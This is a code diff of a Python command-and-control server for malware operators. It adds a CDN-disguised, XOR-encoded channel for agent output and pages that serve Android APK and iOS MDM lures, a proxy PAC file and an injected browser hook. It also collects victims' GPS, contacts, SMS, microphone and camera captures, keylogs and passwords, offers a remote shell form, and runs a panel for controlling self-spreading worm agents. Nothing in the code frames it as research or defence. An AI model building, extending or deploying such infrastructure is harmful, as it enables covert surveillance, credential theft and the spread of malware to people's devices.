+                agents.setdefault(aid,{})["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                agents.setdefault(aid,{})["alive"] = True
+                cmd = agent_cmds.pop(aid, "") or ""
+                resp = _comm_enc(cmd, aid) if (aid and cmd) else (_comm_enc("PING", aid) if aid else "")
+                self._send(resp); return
+
+            self.send_response(404); self.end_headers(); return
 
         if path.startswith("/loot/dl/"):
             fname=os.path.basename(path[9:]); fpath=os.path.join(LOOT_DIR,fname)
@@ -1089,7 +902,7 @@ class H(BaseHTTPRequestHandler):
                     with _lock:
                         for a in agents:
                             if a.startswith("w"): agent_cmds[a].append(cmd)
-                    log(f"[WORM BROADCAST] {cmd}")
+                    log(f"[WORM-BROADCAST] {cmd}")
                 else:
                     agent_cmds[aid].append(cmd); log(f"[CMD] {aid}: {cmd}")
             self._redir("/panel"); return
@@ -1100,7 +913,127 @@ class H(BaseHTTPRequestHandler):
                 try: c=open(agents[aid]["log"]).read()
                 except: c="(empty)"
                 self._html(f"<pre style='color:#0f0;background:#000;padding:20px;white-space:pre-wrap;font-size:12px;max-width:1200px'>{c}</pre>")
+            else:
+                self._redir("/panel")
             return
+
+        # Agent delete
+        if path=="/agent/delete":
+            aid=qs.get("aid",[""])[0]
+            with _lock:
+                agents.pop(aid,None); agent_cmds.pop(aid,None); agent_resps.pop(aid,None)
+            log(f"[DELETE] Agent {aid} removed")
+            self._redir("/panel"); return
+
+        # Clear agent output
+        if path=="/agent/clear_output":
+            aid=qs.get("aid",[""])[0]
+            with _lock:
+                if aid=="__ALL__": agent_resps.clear()
+                elif aid in agent_resps: agent_resps[aid].clear()
+            self._redir("/panel"); return
+
+        # Delete loot file
+        if path=="/loot/delete":
+            fname=qs.get("f",[""])[0]
+            if fname:
+                fp=os.path.join(LOOT_DIR,os.path.basename(fname))
+                try: os.remove(fp)
+                except: pass
+            self._redir("/panel"); return
+
+        # Clear all loot
+        if path=="/loot/clear":
+            if os.path.isdir(LOOT_DIR):
+                for f in os.listdir(LOOT_DIR):
+                    try: os.remove(os.path.join(LOOT_DIR,f))
+                    except: pass
+            self._redir("/panel"); return
+
+        # Clear credentials
+        if path=="/creds/clear":
+            try: open(CREDS_FILE,"w").close()
+            except: pass
+            self._redir("/panel"); return
+
+        # ── Mobile endpoints ──────────────────────────────────────────
+        # Serve Android APK lure page
+        if path == "/m/android-lure":
+            lure = os.path.join(PAYLOAD_DIR, "android_lure.html")
+            op_lure = os.path.join(os.path.dirname(__file__), "..", "mobile", "lure", "android.html")
+            for p2 in [lure, op_lure]:
+                if os.path.exists(p2):
+                    self._html(open(p2).read()); return
+            self._html("<h2>Android lure not found — run: start mobile</h2>"); return
+
+        # Serve Android APK payload
+        if path == "/m/android":
+            apk = os.path.join(PAYLOAD_DIR, "update.apk")
+            if os.path.exists(apk):
+                with open(apk,"rb") as f: data=f.read()
+                self.send_response(200)
+                self.send_header("Content-Type","application/vnd.android.package-archive")
+                self.send_header("Content-Disposition",'attachment; filename="update.apk"')
+                self.send_header("Content-Length",len(data)); self._cors(); self.end_headers()
+                self.wfile.write(data)
+            else:
+                self._html("<h3>APK not built — run: start mobile → Android APK</h3>")
+            return
+
+        # Serve iOS MDM profile
+        if path == "/m/ios":
+            profile = os.path.join(PAYLOAD_DIR, "wizza_profile.mobileconfig")
+            if os.path.exists(profile):
+                with open(profile,"rb") as f: data=f.read()
+                self.send_response(200)
+                self.send_header("Content-Type","application/x-apple-aspen-config")
+                self.send_header("Content-Disposition",'attachment; filename="profile.mobileconfig"')
+                self.send_header("Content-Length",len(data)); self._cors(); self.end_headers()
+                self.wfile.write(data)
+            else:
+                lure_f = os.path.join(PAYLOAD_DIR, "ios_lure.html")
+                op_lure = os.path.join(os.path.dirname(__file__), "..", "mobile", "lure", "ios.html") if not os.path.exists(lure_f) else lure_f
+                if os.path.exists(op_lure): self._html(open(op_lure).read())
+                else: self._html("<h3>iOS MDM profile not generated — run: start mobile → iOS MDM</h3>")
+            return
+
+        # Serve iOS lure page
+        if path == "/m/ios-lure":
+            for p2 in [os.path.join(PAYLOAD_DIR,"ios_lure.html"),
+                       os.path.join(os.path.dirname(__file__),"..","mobile","lure","ios.html")]:
+                if os.path.exists(p2): self._html(open(p2).read()); return
+            self._html("<h3>iOS lure not found</h3>"); return
+
+        # Serve PAC file
+        if path == "/m/proxy.pac":
+            pac = os.path.join(PAYLOAD_DIR, "proxy.pac")
+            if os.path.exists(pac):
+                self._send(open(pac).read(), "application/x-ns-proxy-autoconfig"); return
+            self._html(""); return
+
+        # Serve browser hook JS (for MitM injection)
+        if path == "/m/hook.js":
+            hook = os.path.join(os.path.dirname(__file__), "..", "mobile", "browser_hook.js")
+            if os.path.exists(hook):
+                js = open(hook).read()
+                host = self.headers.get("Host","localhost")
+                js = js.replace("__C2URL__", f"https://{host}")
+                self._send(js, "application/javascript"); return
+            self._send("", "application/javascript"); return
+
+        # Mobile agent poll — returns pending command
+        if path == "/mobile/cmd":
+            sid = qs.get("sid",[""])[0] or qs.get("aid",[""])[0]
+            with _lock:
+                if sid in mobile_agents:
+                    mobile_agents[sid]["last_seen"] = ts()
+                    cmd_entry = mobile_cmds[sid].pop(0) if mobile_cmds[sid] else {}
+                    self._send(json.dumps(cmd_entry), "application/json"); return
+            self._send("{}", "application/json"); return
+
+        # Mobile panel
+        if path == "/mobile":
+            self._html(self._mobile_panel()); return
 
         self._html(self._panel())
 
@@ -1115,6 +1048,27 @@ class H(BaseHTTPRequestHandler):
                 _handle_result(aid,cmd,out)
             self._send("OK"); return
 
+        # ── CDN-disguised agent data POST (/cdn-cgi/apps/data) ──────────
+        if p.path == "/cdn-cgi/apps/data":
+            try:
+                body_str = b.decode(errors="replace")
+                # Form-encoded: d=<xor-b64>&v=<aid>
+                body_qs  = parse_qs(body_str)
+                aid  = unquote_plus(body_qs.get("v",[""])[0])
+                enc  = unquote_plus(body_qs.get("d",[""])[0])
+                raw  = _comm_dec(enc, aid) if aid else enc
+                # Format: "<output>|cmd=<cmd>"
+                if "|cmd=" in raw:
+                    out_part, cmd_part = raw.rsplit("|cmd=", 1)
+                    cmd = unquote_plus(cmd_part)
+                else:
+                    out_part = raw; cmd = "?"
+                if aid and cmd and cmd not in ("PING",""):
+                    _handle_result(aid, cmd, out_part)
+                    agents.setdefault(aid,{})["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            except Exception: pass
+            self._send(_comm_enc("OK", aid) if aid else "OK"); return
+
         if p.path=="/catch":
             try:
                 d=json.loads(b.decode(errors="replace"))
@@ -1122,6 +1076,98 @@ class H(BaseHTTPRequestHandler):
                 open(CREDS_FILE,"a").write(line); log(f"[CREDS] {line.strip()}")
             except: pass
             self._send("OK"); return
+
+        # ── Mobile agent endpoints ─────────────────────────────────────
+        if p.path == "/mobile/register":
+            try:
+                d = json.loads(b.decode(errors="replace"))
+                sid = d.get("agent_id") or d.get("sid") or f"m{int(time.time())}"
+                info = d.get("info", {})
+                with _lock:
+                    mobile_agents[sid] = {
+                        "sid":       sid,
+                        "ip":        self.client_address[0],
+                        "os":        info.get("os","?"),
+                        "platform":  info.get("platform","?"),
+                        "hostname":  info.get("hostname","?"),
+                        "device":    f"{info.get('device_manufacturer','')} {info.get('device_model','')}".strip(),
+                        "termux":    info.get("termux", False),
+                        "ua":        info.get("ua",""),
+                        "first_seen":ts(), "last_seen":ts(), "type":"mobile",
+                    }
+                log(f"[MOBILE] {sid} | {mobile_agents[sid]['os']} | {mobile_agents[sid]['device'] or mobile_agents[sid]['hostname']} | {self.client_address[0]}")
+                self._send(json.dumps({"ok": True, "sid": sid}), "application/json")
+            except Exception as e:
+                self._send(json.dumps({"ok": False, "err": str(e)}), "application/json")
+            return
+
+        if p.path == "/mobile/data":
+            try:
+                d = json.loads(b.decode(errors="replace"))
+                sid     = d.get("aid") or d.get("sid","unknown")
+                payload = d.get("payload", d)
+                dtype   = payload.get("type","unknown") if isinstance(payload,dict) else "raw"
+
+                # Save to mobile dir
+                fname = f"{sid}_{dtype}_{int(time.time())}.json"
+                fpath = os.path.join(MOBILE_DIR, fname)
+                with open(fpath, "w") as f:
+                    json.dump({"sid": sid, "ts": ts(), "type": dtype, "data": payload}, f, indent=2)
+
+                # Also save media to loot
+                if isinstance(payload, dict) and dtype in ("mic","camera","screenshot"):
+                    raw = payload.get("data","")
+                    if raw and isinstance(raw, str):
+                        if raw.startswith("data:"):
+                            raw = raw.split(",",1)[1]
+                        try:
+                            ext = {"mic":"m4a","camera":"jpg","screenshot":"jpg"}.get(dtype,"bin")
+                            lf = os.path.join(LOOT_DIR, f"mobile_{sid}_{dtype}_{int(time.time())}.{ext}")
+                            with open(lf,"wb") as f:
+                                f.write(base64.b64decode(raw))
+                            log(f"[MOBILE-LOOT] {sid} {dtype} → {lf}")
+                        except Exception: pass
+
+                # For text data, also append to mobile agent log
+                if dtype in ("gps","gps_ip","contacts","sms","keylog","form","password","clipboard","shell_result","info","wifi"):
+                    logf = os.path.join(MOBILE_DIR, f"{sid}.log")
+                    with open(logf,"a") as f:
+                        f.write(f"[{ts()}] [{dtype}] {json.dumps(payload)}\n")
+                    log(f"[MOBILE-DATA] {sid} → {dtype}")
+
+                # Catch credentials from browser hook form/password events
+                if dtype in ("form","password"):
+                    fields = payload.get("fields",{}) if dtype=="form" else {payload.get("field","pw"): payload.get("value","")}
+                    page   = payload.get("action","") or payload.get("page","")
+                    line   = f"[{ts()}]  user={fields.get('username',fields.get('email',fields.get('user','?')))!r}  pass={list(fields.values())[-1]!r}  src=mobile:{page}\n"
+                    open(CREDS_FILE,"a").write(line)
+                    log(f"[MOBILE-CREDS] {line.strip()}")
+
+                with _lock:
+                    if sid in mobile_agents:
+                        mobile_agents[sid]["last_seen"] = ts()
+                        mobile_data[sid].append({"ts":ts(),"type":dtype})
+
+                self._send(json.dumps({"ok":True}), "application/json")
+            except Exception as e:
+                self._send(json.dumps({"ok":False,"err":str(e)}), "application/json")
+            return
+
+        # Send command to mobile agent (from operator)
+        if p.path == "/mobile/sendcmd":
+            try:
+                d = json.loads(b.decode(errors="replace"))
+                sid = d.get("sid","")
+                cmd = d.get("cmd","")
+                args = d.get("args",{})
+                if sid and cmd:
+                    with _lock:
+                        mobile_cmds[sid].append({"cmd": cmd, "args": args})
+                    log(f"[MOBILE-CMD] {sid}: {cmd}")
+                self._redir("/mobile")
+            except:
+                self._redir("/mobile")
+            return
 
         # Form POST from panel
         params=parse_qs(b.decode(errors="replace"))
@@ -1136,140 +1182,180 @@ class H(BaseHTTPRequestHandler):
         self._redir("/panel")
 
     def _panel(self):
-        SPREAD_CMDS={"USB_SPREAD","SSH_KEY_SPREAD","SSH_SCAN_SPREAD","SSH_SPRAY_SPREAD",
-                     "SMB_SPREAD","SMB_SPREAD_AUTH","NETMOUNT_SPREAD","NETMOUNT_AUTO",
-                     "EMAIL_SPREAD","EMAIL_SPREAD_AUTO","GIT_POISON","DOCKER_ESCAPE",
-                     "DOCKER_AUTO","WORM_STATUS","WORM_PAUSE","WORM_RESUME",
-                     "WORM_STOP_SPREAD","WORM_START_SPREAD","WORM_SPREAD_NOW"}
-        sorted_aids=sorted(agents.keys(),key=lambda k:(0 if "js" not in agents[k].get("type","") else 1,k))
+        sorted_aids=sorted(agents.keys(),key=lambda k:(0 if agents[k].get("type","")!="js" else 1,k))
         rows=opts=""; first=sorted_aids[0] if sorted_aids else ""
-        # Identify worm agents (IDs start with 'w') vs regular agents
         worm_aids=[a for a in sorted_aids if a.startswith("w")]
-        first_worm=worm_aids[0] if worm_aids else (sorted_aids[0] if sorted_aids else "")
+        fw=worm_aids[0] if worm_aids else ""
         for aid in sorted_aids:
-            a=agents[aid]
-            st=a.get("status","ONLINE"); t=a.get("type","tcp"); prv=a.get("priv","?")
+            a=agents[aid]; st=a.get("status","ONLINE"); t=a.get("type","tcp"); prv=a.get("priv","?")
             is_worm=aid.startswith("w")
-            dot="js" if "js" in t else ("on" if st=="ONLINE" else "off")
-            ptag=f"<span class='tag root'>{prv}</span>" if prv in("ROOT","ADMIN") else f"<span class='tag user'>{prv}</span>"
-            ttag=f"<span class='tag js'>{t}</span>" if "js" in t else (f"<span class='tag' style='color:#f0a;border-color:#f0a'>worm</span>" if is_worm else f"<span class='tag http'>{t}</span>")
-            stag=f"<span class='tag on'>{st}</span>" if st=="ONLINE" else f"<span class='tag off'>{st}</span>"
-            so=a["os"][:60]+"…" if len(a["os"])>60 else a["os"]
+            cls="worm" if is_worm else ("js" if "js" in t else ("on" if st=="ONLINE" else "off"))
+            pcls="root" if prv in("ROOT","ADMIN") else ""
+            so=a["os"][:50]+"…" if len(a["os"])>50 else a["os"]
+            wlabel=" <span class='tag' style='color:var(--pink)'>worm</span>" if is_worm else ""
             rows+=(f"<tr data-aid='{aid}'>"
-                   f"<td><b style='color:{'#f0a' if is_worm else 'var(--b)'}'>{aid}</b></td>"
-                   f"<td>{a['ip']}</td>"
-                   f"<td title='{a['os']}' style='max-width:280px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap'>{so}</td>"
-                   f"<td>{a['hostname']} / <span style='color:var(--y)'>{a.get('user','?')}</span></td>"
-                   f"<td>{ptag}</td>"
-                   f"<td><span class='dot {dot}'></span>{ttag}</td>"
-                   f"<td>{stag}</td>"
-                   f"<td style='color:var(--dim)'>{a['last_seen']}</td>"
-                   f"<td class='act'><a href='/logs?aid={aid}'>log</a>"
-                   f"<a href='/q?aid={aid}&cmd=RECON'>recon</a>"
-                   f"<a href='/q?aid={aid}&cmd=SCREENSHOT'>shot</a>"
-                   f"<a href='/q?aid={aid}&cmd=WEBCAM'>cam</a></td></tr>")
-            opts+=f"<option value='{aid}'>{aid} ({prv}) {a['ip']} {t}</option>"
-        opts+="<option value='__ALL__'>★ ALL AGENTS (broadcast)</option>"
-        # Worm selector (only worm agents for worm control tab)
+                   f"<td><span class='{cls}'>{aid}</span>{wlabel}</td>"
+                   f"<td>{a['ip']}</td><td title='{a['os']}'>{so}</td>"
+                   f"<td>{a['hostname']}/{a.get('user','?')}</td>"
+                   f"<td class='{pcls}'>{prv}</td>"
+                   f"<td class='{cls}'>{t}<span class='tag'>{st}</span></td>"
+                   f"<td class='{cls}'>{a['last_seen']}</td>"
+                   f"<td style='white-space:nowrap'>"
+                   f"<a class='qa' href='/logs?aid={aid}'>log</a> "
+                   f"<a class='qa g' href='/q?aid={aid}&cmd=RECON'>recon</a> "
+                   f"<a class='qa g' href='/q?aid={aid}&cmd=SCREENSHOT'>ss</a> "
+                   f"<a class='qa' href='/agent/clear_output?aid={aid}'>clr</a> "
+                   f"<a class='qa r' href='/agent/delete?aid={aid}' onclick='return confirm(\"Delete {aid}?\")'>del</a>"
+                   f"</td></tr>")
+            opts+=f"<option value='{aid}'>{aid} ({prv}) {a['ip']} [{t}]</option>"
+        opts+="<option value='__ALL__'>★ ALL AGENTS</option>"
+        if not rows: rows=f"<tr><td colspan='8' style='color:var(--sub);text-align:center;padding:30px'>No agents connected yet...</td></tr>"
         worm_opts=""
         for aid in worm_aids:
-            a=agents[aid]; st=a.get("status","?")
-            worm_opts+=f"<option value='{aid}'>{aid} {a['ip']} {a['hostname']} [{st}]</option>"
-        if not worm_opts: worm_opts="<option value=''>-- no worm agents online --</option>"
-        worm_opts+="<option value='__ALL_WORMS__'>★ ALL WORMS</option>"
-        if not rows: rows="<tr><td colspan='9' style='color:var(--dim);text-align:center;padding:30px'>No agents connected — waiting...</td></tr>"
-        # Credentials
+            a=agents[aid]; worm_opts+=f"<option value='{aid}'>{aid} {a['ip']} [{a.get('status','?')}]</option>"
+        worm_opts+="<option value='__ALL_WORMS__'>🧬 ALL WORMS</option>"
+        if not worm_aids: worm_opts="<option value=''>No worms connected</option>"+worm_opts
         cr=""
         try:
-            for line in reversed(open(CREDS_FILE).readlines()[-20:]):
+            for line in open(CREDS_FILE).readlines()[-20:]:
                 parts={}
                 [parts.__setitem__(*(tok.split("=",1))) for tok in line.strip().split("  ") if "=" in tok]
-                u=parts.get("user","?").strip("'"); p=parts.get("pass","?").strip("'"); s=parts.get("src","?")
-                cr+=(f"<div class='cred'>"
-                     f"<span style='color:var(--dim);font-size:10px'>user</span> <span class='u'>{u}</span>"
-                     f"&nbsp;&nbsp;<span style='color:var(--dim);font-size:10px'>pass</span> <span class='p'>{p}</span>"
-                     f"&nbsp;&nbsp;<span class='src'>{s}</span></div>")
+                cr+=(f"<div class='ci'>user=<span class='cv'>{parts.get('user','?').strip(chr(39))}</span>  "
+                     f"pass=<span class='cv'>{parts.get('pass','?').strip(chr(39))}</span>  "
+                     f"<span class='tag'>{parts.get('src','?')}</span></div>")
         except: pass
-        if not cr: cr="<p style='color:var(--dim);padding:20px 0'>No credentials captured yet.</p>"
-        # Output
+        if not cr: cr="<p style='color:var(--sub);padding:20px'>No credentials captured yet.</p>"
         ou=""
         for aid,rs in list(agent_resps.items()):
-            for r in rs[-5:]:
-                loot_html=""
+            for r in rs[-6:]:
+                img_html=""
                 if r.get("type")=="image" and r.get("loot"):
-                    lf=r['loot']; loot_html=f"<img src='/loot/dl/{lf}' class='eimg' loading='lazy'>"
-                ou+=(f"<div class='entry'><div class='ehdr'>"
-                     f"<span class='eaid'>[{aid}]</span>"
-                     f"<span class='ecmd'>{r['cmd'][:80]}</span>"
-                     f"<span class='etime'>{r['ts']}</span></div>"
-                     f"<div class='eout'>{r['resp'][:4000]}</div>{loot_html}</div>")
-        if not ou: ou="<div style='color:var(--dim);padding:20px;text-align:center'>No output yet — send a command to an agent.</div>"
-        # Loot gallery
+                    lf=r['loot']
+                    img_html=(f"<div class='rimg'><img src='/loot/dl/{lf}' loading='lazy'>"
+                              f"<br><a class='qa r' style='margin-top:4px;display:inline-block' "
+                              f"href='/loot/delete?f={lf}' onclick='return confirm(\"Delete image?\")'>🗑 del image</a></div>")
+                ou+=(f"<div class='rb'><div class='rh'>"
+                     f"<span class='ra'>[{aid}]</span><span class='rc'>{r['cmd'][:80]}</span>"
+                     f"<span class='rt'>{r['ts']}</span>"
+                     f"<a class='rdel' href='/agent/clear_output?aid={aid}' title='Clear output'>🗑</a>"
+                     f"</div><div class='rbody'>{r['resp'][:4000]}</div>{img_html}</div>")
+        if not ou: ou="<p style='color:var(--sub);padding:20px'>No output yet.</p>"
         lg=""
         if os.path.isdir(LOOT_DIR):
-            files=sorted(os.listdir(LOOT_DIR),reverse=True)[:24]
-            for f in files:
+            for f in sorted(os.listdir(LOOT_DIR),reverse=True)[:40]:
                 fp=os.path.join(LOOT_DIR,f); sz=os.path.getsize(fp)
+                img=""
                 if f.lower().endswith((".png",".jpg",".jpeg")):
-                    lg+=(f"<div class='loot-card'><img src='/loot/dl/{f}' loading='lazy'>"
-                         f"<div class='li'><div class='lf'>{f}</div>"
-                         f"<div class='ls'>{sz//1024} KB</div>"
-                         f"<a class='la' href='/loot/dl/{f}' download>&#x2B07; download</a></div></div>")
-                else:
-                    lg+=(f"<div class='loot-card'>"
-                         f"<div style='padding:30px;text-align:center;color:var(--dim);font-size:28px'>&#x1F4C4;</div>"
-                         f"<div class='li'><div class='lf'>{f}</div>"
-                         f"<div class='ls'>{sz//1024} KB</div>"
-                         f"<a class='la' href='/loot/dl/{f}' download>&#x2B07; download</a></div></div>")
-        if not lg: lg="<div style='color:var(--dim);padding:20px'>No loot yet.</div>"
-        # Worm family cards
+                    img=f"<img src='/loot/dl/{f}' loading='lazy'>"
+                lg+=(f"<div class='lc'>{img}<div class='lf'>{f}</div><div class='ls'>{sz//1024}KB</div>"
+                     f"<a class='qa' href='/loot/dl/{f}' download>⬇ dl</a> "
+                     f"<a class='qa r' href='/loot/delete?f={f}' onclick='return confirm(\"Delete?\")'>🗑</a></div>")
+        if not lg: lg="<p style='color:var(--sub);padding:20px'>No loot yet.</p>"
         wf=""
         for aid in worm_aids:
-            a=agents[aid]; st=a.get("status","ONLINE")
-            # Collect recent spread events for this worm
-            recent=[]
-            for r in list(agent_resps.get(aid,[])):
-                if any(r['cmd'].startswith(x) for x in ["USB_SPREAD","SSH_","SMB_","NET","EMAIL","GIT","DOCKER","WORM_","AUTO_EXFIL"]):
-                    recent.append(r)
-            recent=recent[-8:]
-            sc=f"<span style='color:var(--g)'>ONLINE</span>" if st=="ONLINE" else f"<span style='color:var(--r)'>OFFLINE</span>"
-            feed=""
-            for r in reversed(recent):
-                cmd=r['cmd']; resp=r['resp'][:120].replace('<','&lt;'); t_=r['ts']
-                col="var(--g)" if "SPREAD" in cmd or "AUTO" in cmd else "var(--b)"
-                feed+=f"<div style='padding:3px 0;border-bottom:1px solid #111;display:flex;gap:8px'><span style='color:{col};min-width:140px'>{cmd}</span><span style='color:var(--dim);font-size:10px'>{t_}</span><span style='color:#888;font-size:10px'>{resp}</span></div>"
-            if not feed: feed="<div style='color:var(--dim);font-size:10px;padding:6px 0'>No spread activity yet</div>"
-            wf+=(f"<div style='background:var(--bg2);border:1px solid rgba(255,0,170,.2);border-radius:5px;padding:14px;margin-bottom:12px'>"
-                 f"<div style='display:flex;align-items:center;gap:12px;margin-bottom:10px;flex-wrap:wrap'>"
-                 f"<span style='color:#f0a;font-weight:bold;font-size:13px'>&#x1F9A0; {aid}</span>"
-                 f"<span style='color:var(--dim)'>{a['ip']}</span>"
-                 f"<span style='color:var(--dim)'>{a['hostname']}</span>"
-                 f"<span style='color:var(--y)'>{a.get('user','?')}</span>"
-                 f"<span style='color:var(--dim);font-size:10px'>{a['os'][:50]}</span>"
-                 f"<span style='margin-left:auto'>{sc}</span>"
-                 f"<span style='color:var(--dim);font-size:10px'>{a['last_seen']}</span>"
-                 f"<a href='/q?aid={aid}&cmd=WORM_STATUS' style='font-size:10px;color:var(--g)'>STATUS</a>"
-                 f"<a href='/q?aid={aid}&cmd=WORM_SPREAD_NOW' style='font-size:10px;color:var(--b)'>SPREAD NOW</a>"
-                 f"<a href='/q?aid={aid}&cmd=WORM_PAUSE' style='font-size:10px;color:var(--y)'>PAUSE</a>"
-                 f"<a href='/q?aid={aid}&cmd=WORM_STOP_SPREAD' style='font-size:10px;color:var(--r)'>STOP</a>"
-                 f"</div>"
-                 f"<div style='font-size:10px;color:var(--dim);margin-bottom:6px;letter-spacing:1px'>RECENT ACTIVITY</div>"
-                 f"{feed}</div>")
-        worm_count=len(worm_aids)
-        worm_online=len([a for a in worm_aids if agents[a].get("status")=="ONLINE"])
-        if not wf: wf="<div style='color:var(--dim);padding:30px;text-align:center'>No worm agents connected.<br><br>Deploy <b style='color:var(--g)'>worm_agent.py</b> on a target — worm IDs start with <b style='color:#f0a'>w</b></div>"
+            a=agents[aid]; st=a.get("status","?")
+            scol="var(--grn)" if st=="ONLINE" else "var(--red)"
+            last_out=""
+            if aid in agent_resps and agent_resps[aid]:
+                last_out=agent_resps[aid][-1].get("resp","")[:300]
+            wlog=f"<div class='wl'>{last_out}</div>" if last_out else ""
+            wf+=(f"<div class='wc'><span class='wi'>🧬 {aid}</span>"
+                 f"<div class='wn'>{a['ip']} · {a['os'][:60]} · {a['hostname']}/{a.get('user','?')}</div>"
+                 f"<div class='wn'>Status: <span style='color:{scol}'>{st}</span> · {a['last_seen']}"
+                 f" · <a class='qa r' href='/agent/delete?aid={aid}' onclick='return confirm(\"Remove?\")'>remove</a></div>"
+                 f"{wlog}</div>")
+        if not wf: wf="<p style='color:var(--sub);padding:20px'>No worm agents connected yet.</p>"
         cc=sum(1 for _ in open(CREDS_FILE)) if os.path.exists(CREDS_FILE) else 0
         lc=len(os.listdir(LOOT_DIR)) if os.path.isdir(LOOT_DIR) else 0
-        return HTML_PANEL.format(ac=len([a for a in agents.values() if a.get("status")=="ONLINE"]),
-            wc=worm_count,wo=worm_online,
-            cc=cc,lc=lc,ts=ts(),ar=rows,ao=opts,fa=first,fw=first_worm,
-            worm_opts=worm_opts,cr=cr,ou=ou,lg=lg,wf=wf)
+        wc=len(worm_aids); ac=len([a for a in agents.values() if a.get("status")=="ONLINE"])
+        return HTML_PANEL.format(ac=ac,wc=wc,cc=cc,lc=lc,ts=ts(),ar=rows,ao=opts,
+            fa=first,fw=fw,worm_opts=worm_opts,cr=cr,ou=ou,lg=lg,wf=wf)
 
     def _send(self,body,ct="text/plain",raw=False):
         data=body if raw else (body.encode() if isinstance(body,str) else body)
         self.send_response(200); self.send_header("Content-Type",ct)
         self.send_header("Content-Length",len(data)); self._cors(); self.end_headers()
         self.wfile.write(data)
+    def _mobile_panel(self):
+        rows = ""
+        with _lock:
+            agents_snap = dict(mobile_agents)
+        for sid, a in sorted(agents_snap.items(), key=lambda x: x[1].get("last_seen",""), reverse=True):
+            device = a.get("device") or a.get("hostname","?")
+            os_    = a.get("os","?")
+            ip_    = a.get("ip","?")
+            last   = a.get("last_seen","?")
+            typ_   = "🤖 Termux" if a.get("termux") else ("📱 Browser" if "browser" in a.get("ua","").lower() else "📱 Agent")
+            logf   = os.path.join(MOBILE_DIR, f"{sid}.log")
+            recent = ""
+            if os.path.exists(logf):
+                try:
+                    lines = open(logf).readlines()
+                    recent = "".join(lines[-5:]).replace("<","&lt;").replace(">","&gt;")
+                except: pass
+            rows += f"""<div class="magent">
+  <div class="mhdr">
+    <span class="mtag">{typ_}</span>
+    <span class="msid">{sid}</span>
+    <span class="mdev">{device}</span>
+    <span class="mos">{os_}</span>
+    <span class="mip">{ip_}</span>
+    <span class="mts">{last}</span>
+  </div>
+  {f'<pre class="mlog">{recent}</pre>' if recent else ''}
+  <div class="mcmds">
+    <form method="POST" action="/mobile/sendcmd">
+      <input type="hidden" name="sid" value="{sid}">
+      <select name="cmd">
+        <option value="gps">GPS</option>
+        <option value="contacts">Contacts</option>
+        <option value="sms">SMS</option>
+        <option value="calls">Call Log</option>
+        <option value="mic">Record Mic (10s)</option>
+        <option value="camera">Camera Snap</option>
+        <option value="clipboard">Clipboard</option>
+        <option value="wifi">WiFi Info</option>
+        <option value="info">Device Info</option>
+        <option value="ls">List Files</option>
+      </select>
+      <button type="submit">Send</button>
+    </form>
+    <form method="POST" action="/mobile/sendcmd" style="display:inline">
+      <input type="hidden" name="sid" value="{sid}">
+      <input type="hidden" name="cmd" value="shell">
+      <input name="args" placeholder="shell command..." style="width:200px">
+      <button type="submit">Exec</button>
+    </form>
+  </div>
+</div>"""
+        if not rows:
+            rows = "<p style='color:#666;padding:20px'>No mobile agents connected yet.<br>Deploy a payload via <b>start mobile</b></p>"
+        return f"""<!DOCTYPE html><html><head>
+<meta charset="UTF-8"><title>Mobile Agents</title>
+<style>
+body{{background:#111;color:#eee;font-family:monospace;padding:20px}}
+h2{{color:#4af;margin-bottom:16px}}
+.magent{{background:#1e1e1e;border:1px solid #333;border-radius:8px;padding:14px;margin-bottom:12px}}
+.mhdr{{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:8px;align-items:center}}
+.mtag{{background:#1a6e3a;color:#7dff9c;padding:2px 8px;border-radius:4px;font-size:12px}}
+.msid{{color:#aaa;font-size:12px}}
+.mdev{{color:#fff;font-weight:bold}}
+.mos,.mip,.mts{{color:#888;font-size:12px}}
+.mlog{{background:#0a0a0a;padding:8px;border-radius:4px;font-size:11px;color:#9f9;max-height:100px;overflow:auto;margin-bottom:8px;white-space:pre-wrap}}
+.mcmds select,.mcmds input{{background:#2a2a2a;color:#eee;border:1px solid #444;padding:4px 8px;border-radius:4px}}
+.mcmds button{{background:#1a73e8;color:white;border:none;padding:4px 12px;border-radius:4px;cursor:pointer;margin-left:4px}}
+.back{{color:#4af;text-decoration:none;display:inline-block;margin-bottom:16px}}
+</style></head><body>
+<a class="back" href="/panel">← Panel</a>
+<h2>📱 Mobile Agents ({len(agents_snap)})</h2>
+<p style="color:#888;font-size:12px;margin-bottom:16px">
+  Android lure: <a href="/m/android-lure" style="color:#4af">/m/android-lure</a> &nbsp;|&nbsp;
+  iOS lure: <a href="/m/ios-lure" style="color:#4af">/m/ios-lure</a> &nbsp;|&nbsp;
+  Loot: <a href="/loot" style="color:#4af">/loot</a>
+</p>
+{rows}
+</body></html>"""
+
     def _html(self,body):
         data=body.encode() if isinstance(body,str) else body
         self.send_response(200); self.send_header("Content-Type","text/html; charset=utf-8")
@@ -1280,7 +1366,20 @@ class H(BaseHTTPRequestHandler):
 
 if __name__=="__main__":
     threading.Thread(target=agent_listener,daemon=True).start()
-    log(f"[*] Panel  → http://0.0.0.0:{C2_PORT}/panel")
+    httpd=HTTPServer(("0.0.0.0",C2_PORT),H)
+    scheme="http"
+    if USE_TLS:
+        cert,key=_gen_cert()
+        if cert and key:
+            ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            ctx.load_cert_chain(cert,key)
+            httpd.socket=ctx.wrap_socket(httpd.socket,server_side=True)
+            scheme="https"
+            log("[TLS] Certificate loaded — HTTPS enabled")
+        else:
+            log("[TLS] cert generation failed — falling back to HTTP")
+    log(f"[*] Panel  → {scheme}://0.0.0.0:{C2_PORT}/panel")
     log(f"[*] TCP :4444 | Loot → {LOOT_DIR}")
-    log(f"[*] Portal → http://0.0.0.0:{C2_PORT}/banner")
-    HTTPServer(("0.0.0.0",C2_PORT),H).serve_forever()
+    log(f"[*] Portal → {scheme}://0.0.0.0:{C2_PORT}/banner")
+    httpd.serve_forever()
+
